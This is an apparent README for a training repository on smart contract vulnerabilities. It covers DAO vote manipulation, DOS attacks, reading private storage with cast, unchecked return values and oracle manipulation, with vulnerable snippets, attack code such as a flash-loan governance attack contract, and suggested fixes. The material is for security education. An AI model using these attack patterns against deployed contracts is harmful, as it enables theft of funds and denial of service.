# Smart Contract Hacking

This is a comprehensive summary of various smart contract hacking techniques and codes, intended to serve as a detailed resource for those interested in understanding and exploiting vulnerabilities within smart contracts. This repository aims to provide an extensive range of examples and in-depth explanations to enhance knowledge and practical skills in the field of blockchain security.

## Setup and Test

### install
```
nvm use 18
yarn
```

### build & test
```
cp .env.sample .env
yarn build
yarn test
```

### test for DOS attack exercise 1
Testing the DOS Attacks Exercise 1 located in `test/longer/3-dos-1.ts` takes a long time. Therefore, you should test only this exercise using `yarn test`


## List of Smart Contract Hacking

### DAO Attack
#### Exercise 1
`test/2-dao-attack-1`

##### Attack Vector
```sol
function mint(address _to, uint256 _amount) public onlyOwner {
    _mint(_to, _amount);
    getVotingPower[_to] += _amount;
}
```
This function is a member of a DAO contract that inherits from ERC20. This type of accounting creates a vulnerability because a malicious voter can retain voting power even after transferring their deposit funds.

##### Solution
We have to calculate the voting power in transfer-like functions also.

#### Exercise 2
`test/2-dao-attack-2`

##### Attack Vector
An attacker can get their proposal approved by transferring their deposit funds to a newly created temporary wallet and having that wallet vote for the proposal. The attacker can repeat this process by transferring the funds to another wallet, thereby accumulating enough votes to get the proposal approved.

##### Solution
we need to calculate the voting power in transfer-like functions as well.

#### Exercise 3
`test/2-dao-attack-3`

##### Attack Vector
An attacker can borrow a flash loan to vote for their malicious proposal with the significant voting power acquired from the flash loan. Refer to this flash loan code in the attacker contract.
```sol
function attack() external {
    require(msg.sender == owner, "not owner");
    IPool(pool).flashLoan(IERC20(token).balanceOf(pool));
}

function callBack(uint borrowAmount) external {
    require(msg.sender == pool, "not pool");

    uint256 investmentId = IGovernance(governance).suggestInvestment(owner, treasury.balance);
    IGovernance(governance).executeInvestment(investmentId);

    IERC20(token).transfer(pool, borrowAmount);
}
```

##### Solution
We need to consider using `ERC20Snapshot` for the DAO contract, as demonstrated in Exercise 2.

### DOS Attack

#### Exercise 1
`test/3-dos-attack-1`

##### Attack Vector
```node
const ATTACKER_INVESTMENT = parseEther('0.000000000001');
for (let i = 0; i < 10000; i++) {
    await tokenSale.connect(attacker).invest({ value: ATTACKER_INVESTMENT });
}
```
If an attacker invests a small amount of money numerous times in an ICO, the ICO contract may fail to distribute its ERC20 tokens because the gas limit is exceeded with the following code.
```sol
// investor => [0.0000001, 0.00000001, .....]
for (uint k = 0; k < userInvestments.length; k++) {
    _mint(currentInvestor, userInvestments[k]);
    emit DistributedTokens(currentInvestor, userInvestments[k]);
}
```

#### Exercise 2
`test/3-dos-attack-2`

##### Attack Vector
```node
const attackAuction = await deployContract('AttackAuction', [auction.target], {
    value: currentHighestBid + parseEther('0.00000001')
});
let highestBid = await auction.highestBid();
```
If the `AttackAuction` contract doesn't have any payable function, the following contract function will always fail after the attacker bids. As a result, the bid will no longer work.

```sol
function bid() external payable {
    require(msg.value > highestBid);

    require(currentLeader.send(highestBid));

    currentLeader = payable(msg.sender);
    highestBid = msg.value;
}
```

#### Exercise 3
`test/3-dos-attack-3`

##### Attack Vector
```sol
function flashLoan(uint256 borrowAmount) external nonReentrant {
    // Checks
    require(borrowAmount > 0, "amount should be greater than 0");
    uint256 balanceBefore = shibaToken.balanceOf(address(this));
    require(poolBalance == balanceBefore, "Accounting Issue");
    ...
}
```
This kind of code can create an accounting issue because the `poolBalance` may differ from `shibaToken.balanceOf(address(this))`. An attacker can render the code unusable with the following method.
```node
await token.connect(attacker).transfer(pool.target, parseEther('1'));
```

##### Solution
We have to add calculating code in the payable `receive` function.


### Sensitive On-Chain Data

#### Exercise 1
`test/0-sensitive-on-chain-data-1`

##### Attack Vector
```sol
contract SecretDoor is Ownable, ReentrancyGuard {
  bool public isLocked;
  uint8 private doorNumber;
  bytes32 private doorOwnerName;
  bytes32 private secretSpell;
  ...
}
```
Private variables are not truly private because the data can be found using block explorers or tools like `cast` if an attacker knows the contract address and can guess which storage slots are used for the private variables. The following `cast` command is an example.
```shell
cast storage 0x5aF6D33DE2ccEC94efb1bDF8f92Bd58085432d2c 3 --rpc-url https://rpc.ankr.com/bsc
```
- `0x5aF6D33DE2ccEC94efb1bDF8f92Bd58085432d2c` is the contract address.
- `3` is the storage slot.

##### Solution
Remember that private storage variables are never truly private!

#### Exercise 2
`test/0-sensitive-on-chain-data-2`

##### Attack Vector
```sol
function newRaffle(uint8[3] calldata numbers) external onlyOwner {
    raffleId += 1;
    raffles[raffleId] = numbers;
    isActive = true;
}
```
If you create a contract for a lottery system where users guess numbers, the new secret numbers should be set periodically by the owner. However, what if an attacker knows the `contract address` and the `sighash` for a function like `newRaffle`?

The details are as follows:
```
CMD: cast storage [contract] [slot] --rpc-url https://ethereum-goerli-rpc.allthatnode.com

Slot 0: 0x0000000000000000000000009cc6d4d0d1aac085ff54f254d206d9890f60338c (Owner)
Slot 1: 0x0000000000000000000000000000000000000000000000000000000000000001 (Reentrnacy State Var)
Slot 2: 0x0000000000000000000000000000000000000000000000000000000000000001 (?)
Slot 3: 0x0000000000000000000000000000000000000000000000000000000000000004 (?)

0xc2847b3b - guessNumber sighash
0x3f5a9a5f - newRaffle sighash

Our Block Number: 8660077
Winning TX Block Number: 8660110

Winning transaction:
https://goerli.etherscan.io/tx/0xdb4b3952c434c2c6c0044a5c74e67219f21ecacb8f4ed1bfcd66d97be6cafece

Input data:
0xc2847b3b00000000000000000000000000000000000000000000000000000000000000de000000000000000000000000000000000000000000000000000000000000007e0000000000000000000000000000000000000000000000000000000000000047
[Sighash / Selector]                                               [Number 1]                                                       [Number 2]                                                   [Number 3]

[HEX]  [DEC]
de --> 222
7e --> 126
47 --> 71

Deployed on block: 8655090

newRaffle trnasaciton (from the owner):
https://goerli.etherscan.io/tx/0xdab60e3d7187d9c10b32589a1801d4f6bd0b8830635c5051b9f9f5301fee9f90

Input data:
0x3f5a9a5f00000000000000000000000000000000000000000000000000000000000000de000000000000000000000000000000000000000000000000000000000000007e0000000000000000000000000000000000000000000000000000000000000047
[Sighash / Selector]                                               [Number 1]                                                       [Number 2]                                                   [Number 3]

```

##### Solution
Remember that private storage variables are never truly private, again!

### Unchecked Return Attack

#### Exercise 1
`test/5-unchecked-return-1.ts`

##### Attack Vector
1. Low-level calls like `send`, `call`, `delegatecall`, and `staticcall` do not revert automatically.
2. If you don't check the return value when sending ETH, you can lose the money.
3. This is a bad pattern to follow.
```
payable(_to).send(_amount);
```
or
```
payable(donation.to).call{value: msg.value}("");
```
##### Solution
```
(bool success, ) = payable(donation.to).call{value: msg.value}("");
require(success, "donation failed, couldn't send ETH");
```

### Oracle Manipulation

#### Exercise 1
`test/7-oracle-manipulation-1.ts`

##### Attack Vector
```sol
contract GoldOracle {
  address[] sources;
  mapping(address => uint256) public getPriceBySource;

  modifier onlySource() {
    bool isSource = false;
    for (uint i = 0; i < sources.length; i++) {
      if (msg.sender == sources[i]) {
        isSource = true;
      }
    }
    require(isSource, "Not a source");
    _;
  }

  ...

  function postPrice(uint256 newPrice) external onlySource {
    _setPrice(msg.sender, newPrice);
  }
  ...
}
```
If the keys of sources are compromized, the gold price can be manipulated.

##### Solution

1. **Multi-Sig for Sources**: Use a multi-signature mechanism so that multiple approvals are needed to update the price.
2. **Decentralized Oracles**: Aggregate data from multiple decentralized oracle sources to reduce reliance on individual entities.
3. **Reputation-Based Systems**: Implement a mechanism where sources build a reputation over time, and less trusted sources have less influence.
4. **Consensus Mechanism**: Implement a consensus algorithm among sources to agree on the price.
5. **Price Validations**: Implement validation checks to ensure that the new price is within reasonable bounds.
6. **Time-Locked Updates**: Time-lock the updates so that any change in price will take effect only after a certain period, giving time for review.


### Call Attack
Will be added soon.

### Front Running
Will be added soon.

### Flash Loan Attack
Will be added soon.

### Reply Attack
Will be added soon.

### DEFI Money Markets
Will be added soon.